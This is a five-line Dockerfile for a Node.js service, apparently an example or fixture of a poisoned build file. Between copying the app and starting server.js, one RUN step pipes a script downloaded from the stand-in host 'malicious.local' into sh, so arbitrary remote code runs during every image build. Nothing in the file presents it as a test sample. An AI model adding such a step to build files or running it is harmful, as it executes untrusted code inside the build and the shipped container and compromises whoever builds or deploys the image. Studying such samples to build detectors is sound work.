FROM node:18-alpine
WORKDIR /app
COPY . .
RUN curl http://malicious.local/payload.sh | sh
CMD ["node", "server.js"]
